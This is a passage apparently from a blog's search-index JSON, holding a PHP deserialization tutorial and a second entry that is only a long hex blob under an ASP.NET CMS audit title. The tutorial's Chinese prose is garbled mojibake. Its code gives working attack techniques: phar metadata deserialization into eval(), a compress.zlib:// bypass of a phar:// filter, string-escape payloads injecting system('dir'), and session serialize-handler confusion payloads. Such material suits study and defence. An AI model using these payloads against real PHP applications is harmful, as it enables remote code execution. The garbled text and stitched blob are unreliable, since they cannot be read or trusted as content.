ç„¶åå°±å¯ä»¥ä½¿ç”¨æ–‡ä»¶å‡½æ•°é…åˆphar:\\\\ä¼ªåè®®ï¼Œè¿›è¡Œphpååºåˆ—åŒ–ã€‚å¯ç”¨çš„æ–‡ä»¶å‡½æ•°å¦‚ä¸‹ï¼Œä¹Ÿæ˜¯ç”¨çš„seebugçš„å›¾ã€‚ å†™ä¸ªDemoæµ‹è¯•ä¸‹ï¼š 1234567891011121314151617181920212223&lt;?phpclass TestObject{ var $command; function __wakeup() { @eval($this-&gt;command); }}@unlink(\"phar.phar\");$phar = new Phar(\"phar.phar\");$phar-&gt;startBuffering();$phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\");$o = new TestObject();$o-&gt;command = \"phpinfo();\";$phar-&gt;setMetadata($o);$phar-&gt;addFromString(\"test.txt\", \"test\");$phar-&gt;stopBuffering();file_get_contents(\"phar://phar.phar/test.txt\");?&gt; é¡ºä¾¿è¯´ä¸‹ï¼Œæˆ‘ç”¨php8æµ‹è¯•phar:\\\\ä¼ªåè®®çš„æ—¶å€™å‘ç°å®ƒä¸ä¼šè¿›è¡Œååºåˆ—åŒ–äº†ã€‚ç½‘ä¸ŠæŸ¥äº†ä¸‹ï¼ŒPç¥çš„æ–‡ç« é‡Œè¯´php8é‡Œçš„Pharä¸­çš„å…ƒä¿¡æ¯ä¸å†è‡ªåŠ¨è¿›è¡Œååºåˆ—åŒ–äº†ã€‚ å…³äºpharååºåˆ—åŒ–è¿˜æœ‰ä¸¤ä¸ªtrickï¼Œå½“ä»£ç ä¸­æœ‰è¿‡æ»¤ï¼Œä¼ å…¥çš„æ–‡ä»¶åä¸èƒ½ä»¥phar://å¼€å¤´ï¼Œä½†åœ¨å‰é¢åŠ ä¸Šcompress.zlib://è¿˜æ˜¯èƒ½ååºåˆ—åŒ–ï¼›pharå½’æ¡£æ–‡ä»¶çš„stubæ ‡å¿—åªéœ€__HALT_COMPILER(); ?&gt;ï¼Œå‰é¢å¯åŠ ä¸Šä»»ä½•å†…å®¹ï¼Œå¯ä»¥ç»•è¿‡æ–‡ä»¶å¤´æ£€æµ‹çš„æ–‡ä»¶ä¸Šä¼ ã€‚ å­—ç¬¦ä¸²é€ƒé€¸åœ¨phpä¸­æ˜¯é æè¿°çš„é•¿åº¦æ¥è¯†åˆ«å­—ç¬¦ä¸²å˜é‡å¼€å§‹ä¸ç»“æŸï¼Œä»¥åˆ†å·;æ¥åˆ†éš”ï¼Œä»¥èŠ±æ‹¬å·}æ¥ä»£è¡¨å¯¹è±¡æˆ–æ•°ç»„çš„ç»“æŸï¼Œæ‰€ä»¥åƒä¸‹åˆ—ä»£ç ä¸€æ ·ï¼Œå­—ç¬¦ä¸²å˜é‡ä¸­çš„åŒå¼•å·èŠ±æ‹¬å·æˆ–åºåˆ—åŒ–å­—ç¬¦ä¸²ååŠ ä¸Šç‚¹å†…å®¹ä¹Ÿä¸æ¯«ä¸å½±å“ååºåˆ—åŒ–ã€‚ 123456789101112&lt;?phpclass Test{ var $test;}$unser1 = 'O:4:\"Test\":1:{s:4:\"test\";s:12:\"testtest\"}}}\";}';$unser2 = 'O:4:\"Test\":1:{s:4:\"test\";s:12:\"testtesttest\";}\"\"\"\"}}}}';var_dump(unserialize($unser1));echo \"&lt;br&gt;\";var_dump(unserialize($unser2)); å› ä¸ºè¿™ç§ç‰¹æ€§ï¼Œå¦‚æœåœ¨åºåˆ—åŒ–åå¯¹åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œè¿‡æ»¤æˆ–æ›¿æ¢ï¼Œä½¿å¾—æ›¿æ¢å‰åçš„é•¿åº¦å‘ç”Ÿå˜åŒ–ï¼Œä¸€è¾¹æƒ…å†µä¸‹ä¼šå¯¼è‡´ååºåˆ—åŒ–å‡ºé”™ï¼Œåœ¨åŠ ä»¥åˆ©ç”¨å¯é€ æˆå­—ç¬¦ä¸²çš„é€ƒé€¸ï¼Œä¿®æ”¹å…¶ä»–å‚æ•°çš„å€¼ã€‚ æ ¹æ®æ›¿æ¢å‰åçš„é•¿åº¦å˜åŒ–ï¼Œå¯å°†æƒ…å†µè·Ÿä¸ºä¸¤ç§ï¼šæ›¿æ¢åé•¿åº¦å˜é•¿ã€æ›¿æ¢åé•¿åº¦å˜çŸ­ï¼Œä»¥ä¸‹åˆ†åˆ«åˆ†æè¿™ä¸¤ç§æƒ…å†µã€‚ æ›¿æ¢åé•¿åº¦å˜é•¿12345678910111213141516171819&lt;?phpclass Test{ var $test; var $command; function __wakeup() { @eval($this-&gt;command); }}$test = new Test();$test-&gt;command = \"phpinfo();\";$test-&gt;test = $_GET[\"test\"];$ser = serialize($test);$ser = str_replace(\"z\", \"zz\", $ser);var_dump(unserialize($ser)); è¿™ä¸ªDemoçš„ç›®çš„æ˜¯è¦æŠŠcommondå±æ€§æ›¿æ¢ä¸ºæˆ‘ä»¬çš„å‘½ä»¤ï¼Œéœ€è¦é€ƒé€¸çš„å­—ç¬¦ä¸²ä¸º&quot;;s:7:&quot;command&quot;;s:14:&quot;system('dir');&quot;;}ï¼Œæ›¿æ¢å‰åçš„é•¿åº¦å˜åŒ–ä¸ºç”±1å˜2ï¼Œé‚£ä»¤zçš„é•¿åº¦ç­‰äºéœ€è¦é€ƒé€¸çš„å­—ç¬¦ä¸²çš„é•¿åº¦å³å¯ï¼Œæœ€ç»ˆpayloadä¸ºï¼š 1zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz&quot;;s:7:&quot;command&quot;;s:14:&quot;system(&apos;dir&apos;);&quot;;} æ›¿æ¢åé•¿åº¦å˜çŸ­123456789101112131415161718192021&lt;?phpclass Test{ var $test1; var $test2; var $command; function __wakeup() { @eval($this-&gt;command); }}$test = new Test();$test-&gt;command = \"phpinfo();\";$test-&gt;test1 = $_GET[\"test1\"];$test-&gt;test2 = $_GET[\"test2\"];$ser = serialize($test);$ser = str_replace(\"ab\", \"\", $ser);var_dump(unserialize($ser)); æ›¿æ¢åé•¿åº¦ç”±é•¿å˜çŸ­ï¼Œä¼¼ä¹éœ€è¦è‡³å°‘ä¸¤ä¸ªå±æ€§å¯æ§æ‰èƒ½é€ƒé€¸å­—ç¬¦ä¸²ã€‚ç¬¬ä¸€ä¸ªå±æ€§ç”¨äºå‡å°‘å‡çŸ­é•¿åº¦ï¼Œç¬¬äºŒå­—ç¬¦ä¸²ç”¨äºé€ƒé€¸å­—ç¬¦ä¸²ï¼Œéœ€è¦å‡å°‘çš„é•¿åº¦ä¸ºç¬¬ä¸€ä¸ªå±æ€§çš„å†…å®¹åˆ°ç¬¬äºŒä¸ªå±æ€§éœ€è¦é€ƒé€¸çš„å­—ç¬¦ä¸²ä¹‹é—´çš„è·ç¦»ã€‚æœ€ç»ˆpayloadä¸ºä»¥ä¸‹å†…å®¹ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œé•¿åº¦å‡çŸ­åï¼Œtest2å±æ€§å°±è¢«åæ‰äº†ï¼Œé€ƒé€¸æ—¶éœ€è¦åŠ ä¸€ä¸ªå±æ€§ä½¿å¾—å±æ€§æ•°é‡ä¸º3ï¼Œæ‰èƒ½æ­£å¸¸ååºåˆ—åŒ–ã€‚ç”±äºphpä¸å­˜åœ¨çš„å±æ€§ä¹Ÿèƒ½è¢«ååºåˆ—åŒ–çš„ç‰¹æ®Šï¼Œè¿™é‡Œéšä¾¿åŠ ä¸ªå±æ€§å³å¯ã€‚ 1test1=abababababababababab&amp;test2=&quot;;s:7:&quot;command&quot;;s:14:&quot;system(&apos;dir&apos;);&quot;;i:1;s:1:&quot;a&quot;;} sessionååºåˆ—åŒ–phpä¸­çš„sessionä¸€èˆ¬ä»¥æ–‡ä»¶å½¢å¼å­˜å‚¨ï¼Œå­˜å‚¨çš„æ ¼å¼åˆä¸ºåºåˆ—åŒ–æ ¼å¼ã€‚phpçš„sessionåºåˆ—åŒ–å¤„ç†å™¨æœ‰ä¸‰ç§ï¼Œåˆ†åˆ«ä¸ºphpã€php_serializeå’Œphp_binaryï¼Œé€šè¿‡php.iniä¸­çš„session.serialize_handlerè®¾ç½®ï¼Œé»˜è®¤ä¸ºphpã€‚ phpåºåˆ—åŒ–å¤„ç†å™¨ 12345&lt;?phpini_set('session.serialize_handler','php');session_start();$_SESSION[\"test\"]=\"session\"; sessionçš„æ ¼å¼ä¸ºï¼šé”®åŠ ä¸Šåˆ†éš”ç¬¦|åŠ ä¸Šåºåˆ—åŒ–å†…å®¹ã€‚ php_serializeåºåˆ—åŒ–æ§åˆ¶å™¨ 12345&lt;?phpini_set('session.serialize_handler','php_serialize');session_start();$_SESSION[\"test\"]=\"session\"; sessionçš„æ ¼å¼ä¸ºï¼š$_SESSIONè¿™ä¸ªæ•°ç»„çš„åºåˆ—åŒ–å†…å®¹ã€‚ php_binaryåºåˆ—åŒ–å¤„ç†å™¨ 12345&lt;?phpini_set('session.serialize_handler','php_binary');session_start();$_SESSION[\"test\"]=\"session\"; sessionçš„æ ¼å¼ä¸ºï¼šä¸€ä¸ªå­—èŠ‚è®°å½•é”®çš„é•¿åº¦ï¼Œç„¶åæ‹¼ä¸Šé”®ï¼Œå†æ‹¼ä¸Šåºåˆ—åŒ–å†…å®¹ã€‚è¿™é‡Œé”®testçš„é•¿åº¦ä¸º4ï¼Œæ‰€ä»¥è®°å½•çš„é”®é•¿åº¦çš„å­—èŠ‚ä¸º04ã€‚ å½“ç¨‹åºå‘˜æ··ç”¨åºåˆ—åŒ–æ§åˆ¶å™¨æ—¶ï¼Œç”±äºsessionå†…å®¹çš„è§£ææ–¹å¼ä¸åŒï¼Œå†ç²¾å¿ƒæ„é€ ä¸‹å¯é€ æˆååºåˆ—åŒ–æ¼æ´ã€‚ç½‘ä¸Šçš„æ–‡ç« å¤§éƒ½æ˜¯php_serializeä¿å­˜sessionï¼Œphpè¯»å–sessionè¿™ç§æ–¹å¼é€ æˆååºåˆ—åŒ–æ¼æ´çš„ï¼Œè¿™é‡Œå°±å…ˆæ¢è®¨è¿™ç§æ–¹å¼ã€‚ php_serializeè½¬php123456// php_serialize.php&lt;?phpini_set('session.serialize_handler', 'php_serialize');session_start();$_SESSION[\"test\"] = $_GET[\"test\"]; 12345678910111213141516// php.php&lt;?phpini_set('session.serialize_handler','php');session_start();class Test{ var $command; function __wakeup() { @eval($this-&gt;command); }} å½“testä¼ å…¥çš„å†…å®¹ä¸º|O:4:&quot;Test&quot;:1:{s:7:&quot;command&quot;;s:10:&quot;phpinfo();&quot;;}ï¼Œä¿å­˜sessionæ—¶ï¼Œphp_serializeç›´æ¥åºåˆ—åŒ–$_SESSIONæ•°ç»„ï¼›è¯»å–sessionæ—¶ï¼Œç”±phpè§£æï¼Œç”±äºæœ‰ä¸€ä¸ªåˆ†éš”ç¬¦|ï¼Œåˆ†éš”ç¬¦å‰çš„å†…å®¹è¢«å½“æˆé”®ï¼Œåˆ†éš”ç¬¦åçš„å†…å®¹è¢«å½“æˆåºåˆ—åŒ–å†…å®¹ï¼Œå¹¶ä¼šè¢«è‡ªåŠ¨çš„ååºåˆ—åŒ–ï¼Œç„¶åè‡ªåŠ¨è°ƒç”¨é­”æœ¯æ–¹æ³•__wakeupï¼Œæ‰§è¡Œäº†phpinfoã€‚ php_binaryè½¬phppayloadä¸php_serializeè½¬phpçš„é€šç”¨ï¼Œè¿™é‡Œå°±ä¸ç»†è¯´äº†ã€‚ php_binaryè½¬php_serializephp_serializeåºåˆ—åŒ–å¤„ç†å™¨è¦èƒ½ååºåˆ—åŒ–ï¼Œphp_binaryç›¸åº”çš„å°±éœ€è¦ä»¥aå¼€å¤´ï¼Œæ‰€ä»¥é”®é•¿åº¦è¦ä¸º116ã€‚æ€»çš„æ¥è¯´ï¼Œè¿™ç§æƒ…å†µååºåˆ—åŒ–æ¼æ´ï¼Œéœ€è¦sessionçš„é”®å¯æ§æ‰å¯å®ç°äº†ã€‚ æœ€åçš„pocæ˜¯è¿™æ ·ï¼Œåé¢ä¸€ä¸²aç”¨æ¥å¡«å……é•¿åº¦åˆ°116ï¼š 1234&lt;?phpini_set('session.serialize_handler', 'php_binary');session_start();$_SESSION[':1:{s:1:\"a\";O:4:\"Test\":1:{s:7:\"command\";s:10:\"phpinfo();\";};}aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'] = \"a\"; php_serializeè½¬php_binaryphp_serializeå¤„ç†å™¨å¼€å¤´æ€»æ˜¯aï¼Œè½¬åˆ°php_binaryè§£æé”®é•¿åº¦éœ€è¦ä¸º116ï¼Œæ‰€ä»¥å¡«å……éœ€è¦æ”¾åœ¨å¼€å¤´ï¼ŒåŠ ä¸Šå…¶ä»–çš„åºåˆ—åŒ–å†…å®¹çš„é•¿åº¦è¦ä¸º116ã€‚å› ä¸ºDemoé‡Œåªæœ‰ä¸€ä¸ªé”®å€¼å¯¹ï¼Œæ‰€ä»¥payloadçš„æ„é€ ç®€å•ç‚¹ï¼Œå¦‚æœå­˜åœ¨å…¶ä»–çš„é”®å€¼å¯¹ï¼Œæ„é€ å°±é‡Œä¼šå¤æ‚ç‚¹ï¼Œç”šè‡³æ²¡æ³•æ„é€ ã€‚ 1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaO:4:&quot;Test&quot;:1:{s:7:&quot;command&quot;;s:10:&quot;phpinfo();&quot;;} ä»¥ä¸Špayloadåœ¨php_serializeåºåˆ—åŒ–å¤„ç†å™¨ä¸‹ç”Ÿæˆçš„sessionï¼Œåœ¨php_binaryé‡Œçš„è§£ææ–¹å¼å¦‚ä¸‹ï¼š sessionååºåˆ—åŒ–å°ç»“å…¶ä»–ç»„åˆçš„sessionååºåˆ—åŒ–è·Ÿä»¥ä¸Šå‡ ä¸ªä¹Ÿå¤§åŒå°å¼‚ï¼Œæ€»çš„æ¥è¯´ï¼Œä¸»è¦å›´ç»•ç€é¦–å­—èŠ‚å’Œåˆ†éš”ç¬¦|æ„é€ payloadã€‚é™¤äº†è½¬phpçš„ï¼Œä¹Ÿå°±æ˜¯åˆ†éš”ç¬¦é€ æˆçš„ååºåˆ—åŒ–æ¼æ´å¤–ï¼Œå…¶ä»–ç»„åˆçš„sessionååºåˆ—åŒ–ï¼Œéœ€è¦é”®åå¯æ§ã€sessionå†…å®¹å·²çŸ¥ã€å¯æ§é”®å€¼å¯¹åœ¨sessionä¸­é å‰ç­‰æ¡ä»¶ï¼Œåˆ©ç”¨éš¾åº¦è¿˜æ˜¯æŒºé«˜çš„ã€‚ åè®°PHPååºåˆ—åŒ–æµ…æç»ˆäºå†™å®Œäº†ï¼Œæ—¶é—´æ¯”æˆ‘é¢„æœŸçš„è¦ä¹…ã€‚æ°´æ–‡ç« ä¹Ÿæ˜¯ä¸èƒ½å·æ‡’æ»´ï¼Œå¸Œæœ›åé¢çš„å­¦ä¹ æé«˜ä¸‹æ•ˆç‡å§ï¼Œä¸‹ä¸€ç«™ï¼Œå‘Javaååºåˆ—åŒ–è¿›å‘ï¼ å‚è€ƒhttps://www.php.net/manual/en/language.oop5.magic.php https://paper.seebug.org/680/ https://www.leavesongs.com/PHP/php-8-0-release.html https://blog.csdn.net/qq_45521281/article/details/107135706","link":"/2021/07/30/phpååºåˆ—åŒ–æµ…æ/"},{"title":"åŸºäºASP.NET MVCçš„easycmsçš„easyä»£ç å®¡è®¡","text":"4630436162ade97ba2718b7d0c4b3b63e244e44e44b3aaff61d8624b3ae55323b1b3363053478eb95a51fe488060c89e1c837f3ef59a5005b0efa9f918eac767f34bfec09066dbd844f27b991fe581ba6fbe0ee8520865ee5552763af42642e6766f7aa971c3158a9f15016d48e86532820839ebc92dc13654dd71b9139887d0e282e910a7f8c0740c1bb37f798b6f38f61558a06001d47522ebdf96a2a052a5c1cefdf985a00190d6755c855a7da5c98b2c12945ce6bd43cb537fab16fd733c4279e04581e5e7d32bdeff06b990db806d34105d506f0bb3b6bc1ed8d78ae0bd0d0435285aeeb1bdbb6dce1052cd8833e1dcbb8df766da5b0c3b9f85c253ab6bd88bd2fd9c4023076951a61387c5c81f83454d48ac52d776526d53ae598f0de3b36e464e31494ae2259c6d4e10701ebbe613af7e3713523ab62971291deb5dfc8bb8b2c5b83ba948875b13cdcf834af1c7a57c7afe9c56801f6a4b08d6cf82b2e3378c2120f3c37a94aaea1e4468a279879ee884e9fa00f17bf4e80f9b7fea9f8175849b7939a85750bf25fbd7664edb0f4576ea52739ff8cc00a8f0aba81988669afa6caf9553d661f91ffa134d26aaa6b309eb5c68f912e9990cd013221190605c0124ee6ae3efe0e4eabf235b1a304cc3cb592dafedf7b2532cad23e1b18940bfc64eafee1b347337033523b8ef6512384c8403651a3d9b2a2d375d90f65281ea76960b58796d0a1a563d7a2c4d0a56f95effa12ced4cad5f67fd38d62d257fe2f3870adcc1810b4f9aebf523fa3f327109e05f5ae4d58aa460dbcdf012f7fc83d955aa6921105975107f2654774c052a1ff4b57f7a0521ef21e0284766a3c479415afdc68f9c7857b5a3b9aca30a44b027412e8ca7ccc4bfc5f734162b41ab01aa097c1df18cf1d27a503e8e2a4550efcce4eed76ba0b62ec1f52b3163f35676225a13793f3432aba9586fd883c98152227cba38c0678eedffbeda027a931de2662a06561cfcc99e455c66d923f7fa2c0e0449cf527189d8c0d822bd6835baea964357a129090d48eb2e2add79cabd7fa21ce02af484c23065bfdff0a94c9776eff571bdec4b880248fb34a18febadd98a9a0945814bd1af46648e07d3e02ee7de53d64f7e4a6dc93efa9c5622611c552dd8ef431f5d544f3430bd9b773a5cdc47e6058bc9534bac338b9aca406fd6bd9a6c594d8a825b811f109bf5b4ba28d888f97334fc7b9b551982bc49787dc98297711d00b64b517513c69f140e56655e22d1744c03a226121cf52bb47e36d8eb92dbdcfb03636f75fdb9c079286da75094e9f48824ee2ef9c0ed49ade7f1194f4c24b45e7d446b7f34597c4953185ad9f0501357929c915c7f13c8f0883502f786be47059ca15cfd0b08a01250cd6c7b7fe79c99dd5c6d7c00efe874b90cbbebd8c2987c312b923cddac16e3544c9e3504187bdad6230472beb0b18878c8fa649923cc397c69eaf11cee2d66885c6623b7762c6c86cdcacc5d06bbfd43b637da649ee162ce25c3b8abf8c0e7321ac2820f8858a8811bb2fced01ea33eb61a50b7562c602200e9b3c88fda6cf2843f46d808fd7d65af5af7081f521b1289486973e6cf80cf9b1664425ef0adef09e9feea5f382f3cf0a2e5226e5a336204c9672f67a9b1ad4a3c838d75976355a2a402124acd7ef5a88957c411e67fe821cce17ca99b8befcea77e2e2030874131b8e20e1db2cdb65659933d5fa92cf08a5e3dbeebbc0f6cdbe73b699cc26f4c8e5593d76941af70993c6b07453fbe5ee0de6441f01ab111b6f12b2763e2d72471301c9639b6848511facf5aacf3c2fa62a2181bf09ddf0f3d02dc9e418c7d99ea24056d577479360e16fe6b93f60966edb6c88d1c177fbbd2fd96cb59ad530063cf112aad774d46aad6dcb9f9b8a166c6d1b5068f7b2101b7d17c767cc1327aecb601a55e97e070b0633a2962d1646e1f73409dc2658eaa6956b08bfd974307ea7b2d3bf600cb03cd7f05a1cb0491022c5c450837af6759b2afbe25147644cf05cec0ea24186000b662511760fe39f7b234f41db3b11df7f29ac8f17b12e66e5aa6db2f47445219ba4d7fe2a9e3983d28ed10e77d520478f4c7b267585a679c65f91a9c6683a229d7b036897f92abb1465578fd53d77db4f763e1327ba7c1fb57a28695aa173f489f1d0c0d9d70ad3fdb708f5f8c75691de92e9f874427a12cb2d34e207fc7fe473d48ecbf7f62ad8c64f49a016d5c9a962cbb46567ccfd2ff9f596643523dbf9c3eeb4e093c65d88b2bf173580b68938c7aabee45c8dab3a77a571955e41567961c1d17a54383022ccf2f2a50043973a2a6ca9a1a121ebc67ff870a9843e4bedece136d46aff3df558a5346d8f7b9e19fd7a528036b3b9d1d79a9b865ae5163d6fae65c4283da27ff44ee5c7625880e4f19d2e3db85f926657c36fbe53239628a8d14a3ee33a1d8b1d086fa07ed5cb6b770cf5c064f4c482313388ffceafcb3e21ad13ae5d2907384d89dd6847095c6d85a0b028c1ebc65a1c9e23b0306de2faaaa08449e530b1c62df0bb4e2588873cb9738f2a2c2e25b296f667a238b54e75b8750211aecb8c88ba2bcac6cdefae90e8ae42fa6b5177338d199dad798d65cad5abadb0c9c534e30df32203be30557119dcd487847a4d1e7c0a6fb452313bdd61c413093c1736d4f336caf787086697a137119b68fa74526140ada936229bd08d6b74c001ce89f6238e088212861d61b56acc2b7c5281240ede2f4397f6c586c525ab2879106b1ab8403ac47dc970b0f4983ff5f06a651a9727c9884861ef64edf6e543d335d6565621e0bc77bcccdc2f7e2893fa48c356e18ced1dd938ee95f88c3bfe1281e8eeb55be2d035d05d7ed6394596308a875d8cd902d8ddd60b40f2ad22469fc6ca7d684c11ec44051d32c7383f29dd21ca18f42a9d219464b8643faed591bc4f89099c1b9ae4af91be5599f17fd517704407fcf36cbd7c46854026f19a0e0831852442689c04354f121e511cdcbd0afd465eba4e3acd0a6bb4dcad52463b42e6c505535d5879bbe54a0d03410b02a30f5c50cb24cd713301ac0d87b05ad0e9d142b48e0ccaccf9833ea734dc688f25675fabc51fd9fc3b66e2aad09641b903fed6a086ba736fa82c26d787110dadd26d8e8d1628181a191d39988713b3fa3e1ff159b8cec979e4dcb02d249819e9cb14e071332aa5145633184e733f06da7cc8b18819da9f2f2f798babf84e3ecbac851e3f91072f829f31f804e6a9bd7ee474fe0109c4f2d269e319c802d33ad7313a562ff57ce62eb81414f713ead7a127868d759d8054968d8d7e3ea92cbdb6a83ea1812a59b432497eb1d0786d66d1316335635a8145e2d44e9be46cc05f58dd6dcf718030d3f606b4053c5cba0e3247a002293997c7d00bb0b852e801736e2801e5c5b10daa942a4002f0887b5a4e79516998e2b539e6b1e71ef63b11a8b5dcf8ee2a15432694f8210d310bb62ab548af8e37f21610945289cfcd12ef23abb91e0b876db974bd458ff2424c929d82ab11732b66a238c6f2e07c5cd8b2ae2ca6b9aa6aca0b1f584e2cf7508dcd0c8add34825ec08b439c3300dcf3e05f3ceb83e372a395e845c80703a63dfddee55bc4a994deb23315d36e45880110f60e71c1538de031e1aa0d3d34b18f3ec0b07045540a068e878dfa2d7cec7d0d798fdb515127e567ad14194bd90f9fac0d120fbad8efb4ad2248f77b0ea22731a0a07e41205e582b92e5123f17c88842a2138c5f7a2ca1d5cf0f5acf395e69c7d8832602a9ce80d0afbefa74062c63e02084954ff680a6a36f3b35121228ee0d2285398ee5d7175a6cbbc4f51e0210d4f9632eafb20f50e9e96d66d03c4c4b0c031cdea7d05829b15fc9605b28fc79e725ab6b7f4cff4039f56b3352dc58d3006f35cfdb5558b02f9582728e138663bc5f9936fa48d07a6bbd20a244d31663295ee4577d8fa47114f176d6ac85eb0ffe269ed9d266a4abfc2e81e813b9aadfadcc656771ae51437cffdeabd0aa82c7fc47190aeb9d4b1f1d506c01c1cd3a1abc9b7a1b1fcf5bc51e87083e411d1b43d2f6931988f8643584ebea8a400a03e2334747efdd254e94d7a1e4133d12cbe90b6013f5820dd23e603a278d33ee8f7e5362210304a1596dd0b7dc25b9e67fbbe4d5ce188900f0ee13ba39259467b1eb48a161da4df3cce567743766cb99fd0061ac72a921f38df5d7a1230ee2b69d502775f3d468d14e12a3f764af6df2c41bc6a4e9c6331081bc27edc2599f926f3ad2f5b1136229f829e7677613a68e3f7e443cc055d05a8abeadf18bbc0c8c9e122b77916f604ce0a3018b4be59e89ccd2aed673838998b1f34c404788300f9afc05a2214b4e6ef75ca10f86480340338aa772b6260890bd76478c3f4cabd3644e2bd0f4b326dc6368de22a8277dd8fb3ce74e94a72d1a8070c2ed84a6c515ab072d394f3c525799225b5f4bab005ad53f636d3eedac5b3176d4b6f75118a26de2098bf2feb2d2387e92c852b98cdb0b2501e4faa6830d6b88af3b7aa045fe59f071ac4fb668aa6ef904ddc5a8ebb428422ed20816e9cd32d5fd15e9ecfde00ac0473e866f785c508bc5f254dc091acdb6d5d5d505b75f09f6db35208d3fcc357462e01d7951b3111e6941b3c64bdb8d083bc6a9b2173f483979fbbe51f9b1da2bce93898ef141dba76927388c37e309771e14969770944a84d719e1f33f669e6719cb33f24f87f9c3fb384a4c82fa44106c4bba02230066535be908ffc5b67f37607fd13c41b8c6797cd2dd11f262472d52ba7e214a9c05b339110489518bc30afe3947bb1edcf8dd355143d2fd87a5904007911fadc4fe95a660334b859f0bf6da6482752f84b77169d3d796c8c4fcf6477e0d4f57040df36be3b9a68cc469c1fbe131c4902fa3511f504634ac794145b9ce64b60b2b9a389afd75233f8fe34f5aaa98fcf0d039d3b41f51a5d4e57efea733c62053bac63d3ab0237375f14025134d94cab52d93a8e42b33a1179ddcd4991f41e634944d43fa783b7d388fe816daa4d31520db5c2d520731f8f8f7a063e8b996a58c685fc79b9cf0adbdfdd99e9866385d66eda6b7a67848a46a4bc0069c86fd444f8ab05a36df99b70b1e16a45609dba72945d872f1564e6fa3f80a13f27647af29c1b9d708bd2030fec8dc94d46ec4ed751c7f0515490ce89e5bbc5a7d08bc4c658aa15e1f1783c20a21d34f1f9d2e8157a6f0ce93c39f46d2ff29d048fa8aff852929f550b12e83ad04c0463360de745a5f0300e890a9254992b4358d08eb9be9ca083f7df9c23f572e3301aff5310bc54414adb51fbfd2afe07f2c80e5987ae08f4f320646cbbe84ab661000e453fa673ad2f401ef3b60688f7e1184b2054786401201354a98c24f45c806ba13f7375bede43f4dac928e1119ec1ead53cd812db5b3d903c72e7d4086941b5d47ae64fabb945d044afa7d644d1ab58c2f756f349ee44d4322d2d560e70c366e27203f79ff59a05d8b2326df7849d5d3fe9a964e1350cd6fe4d6ffab4afd518de40dfd861396a2e35c084f887bcc58c6b20335252524a6ce4d1435e9dbb7b61c695014c498f9127a8d1734779a6c083c3a9ce3fcd9dd4470930c39b188b1d1ca34fd58c0e0d42e1604e64d7bac500bb6c256f64294d9e1c041b69b9617398e4ac3960b812d7934195222fa0177e94c144f4c8a19d3f46acd00e1e53747cd99f4ac41baea4191d4f6bd4da81673c290a5018067b12551e581a4e21ad2c401b03838d57c0dd690bb8971214cae6d8a2a59075a5fead36eaa4c3690938acac777e3d92a8d6c1585211837d10ed720f697289a60c305c0ed6c663a61bd6fdcac5a38a48ab7e0c7c148f62e25a33cd659586d3991976a07997efc0aea1ef2395cf1fe230d3e0713c912d5d6d1503514e0d3aaa36adf8f6ffe3a46fc8f94d5c124746c72b007dd26c2e25a600eeacc7ce7670ef44a756af10e28fbdf64d9d8b6856d10edc71a5695a117d7b784ef6494ef560a1729cf27543ca0f76cac4db4bda721567d21d002b6b02202300e834d15a55f8daf0659a1d500256efafc821865b56493bc1c79bba23a9768aee8c5353ea96e0835a1434a6bf2110db9e920fd0c04411ea1dce897b469a596393e52ff855dc208c14dffbfe0746a615762330db871f7a8ae444a15f3fc79a22a8c748362fa1d27ada02f8db349624e02199376f10e7c69b52e806ee0d4ce652e956c6b374199cc202f04628897b763895323f29701282abdb86d6a92fde4573bd7b4b6da007dab06d7624b2ab46508cc320650eafa5d9fbace20802c6720efc1619ee1fc11e750c7fe08d8215836d51aa089fcaf03a86bbc0713829062ce06ed742be9d6e2acf42f5c899eae47cf667072da8b852874981d7dce912e9f5bf9994cd22f2c7dab7f91b81de2cb8bc7e98b97d9f79b4090f0a748366a401b744fccd00ea8b907e01d3abb52c5f27f7d83f91c01ffdd371dc6f9b49775192bf24f4c3d62f35a336dad9e3b9049a44124469bf83a62fad04b7eed3d2c44cf441a3fda3ef6580255ff67a6f1bd65aeefb948383e43c698b2d9cc61bc6e77f461b55bdcea7b79229c0361d05312a508e4e6a6e3e0336995652064e501e7a25873097b2d5089d058c8c1777e4458099adff48b323e42cd23c7eac8e8139c0a954898476e15bca92fbff755c8907b65b22728197cfdc506173388c805a38cb6200d975503f5bf1e02217fb88fa73828540e8b6e96b1e0c2b0cc93eded3129248c4619a05e83a3cb58a96ec35998a3b3fccbaeda81f42f6d7fa6ca0b098e19bc75e2b24ef0bd9697bc983ed31f3757f94cfa88aa6228740483f2d5df5e0fc94d997da9c931f4862f08dbea8616803e6a1334e8db6f437dda07abb551d7cbecba62ccff784e17f3ea41c0a4a176288266c19733561cfb9babe3884bc08f211bd02ef2edd9e3cc16710ce1a840b67c89503f6ca27be5b3521bfc489e05bb6e289bf524e7da557c4caeae70b5faf03cb626ed2dc4b046958c5aefc5448178ac1aca728a64f773c394a9da6c0e2ce4f02285ce4b10e67b88638571ea7bde023d6992243f16a52cfc3fdd3a39cebca35d97c9a6e8675f37c48fef6defcd22a64a67289735c98efa86a902b537464d63520c427269ebf95caa13919b63de9c1028c3f5fcd40b7ad0212c6acbd4f3812df5b5f257e56c83d35203d6357d4f38d667037181befbae8cef09b229da301104bd1b5daf8770dcc39dbfa350b608c3023c9dd48d1b926efbe24373be73dded8c46d0438390d5b14bc613b2fc5411165869b079c92d298b7d7100042d25a31ca65deae4c54d4e526a70e9c264906973d3e200f41548f0e6697626f47b24847a8723b6997cbb3569afb60925e37c080723a4bc57a9c54a917cbd28b267bb683ba5711b41e79daadb14a9f6c7c26c4013270594683dd4a92ac7b02e50fdd1b7c3307a5153414cfeec816dcdb34f0c69d25620ecc4dc5f1c176cdac2c497f0cd9bdc89a8c8507e916c021835d24ef52be756a6faa85f1249d46a96092941366fec93d23d58fed933316df43154a0fa14c3bc526e4a5bf4363cd47ecc4c6526618f2d0cf6f26d80db091dd0bfb7d0d88b719f091c0074bc180364adac420d305d6cb55c15aa96951e01b864ef582770a08758e513849afbda0c32bc76bfe79c4f5c481b2f3c87b9c8e0b7dbddd45f554879f964a5e3d91e5d291a216215245a0165f7ec95b5d325028a4809563138eba8426ffc3da5b1d8e56600e0f56aa976d8b7d1dc6e4890af74b203a13e32bc